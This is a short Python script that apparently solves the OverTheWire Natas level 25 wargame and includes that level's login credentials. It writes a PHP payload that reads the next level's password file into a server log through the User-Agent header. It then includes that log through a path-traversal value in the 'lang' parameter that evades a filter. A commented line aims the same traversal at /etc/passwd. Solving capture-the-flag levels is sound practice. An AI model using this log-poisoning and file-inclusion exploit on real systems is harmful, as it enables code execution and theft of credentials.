import requests
import re

username = "natas25"
password = "UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo"
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.session()
header = {"User-agent":"<?php readfile('/etc/natas_webpass/natas26'); ?>"}
response = session.get(url, auth=(username,password))
sessionID = session.cookies["PHPSESSID"]
response = session.post(url, auth=(username,password),headers=header, data={"lang":f"..././..././..././..././..././/var/www/natas/natas25/logs/natas25_{sessionID}.log"})
#response = session.post(url, auth=(username,password), data={"lang":"..././..././..././..././..././etc/passwd"})

print(response.text)
#print (re.findall("Password: (.*)</pre>",response.text)[0])
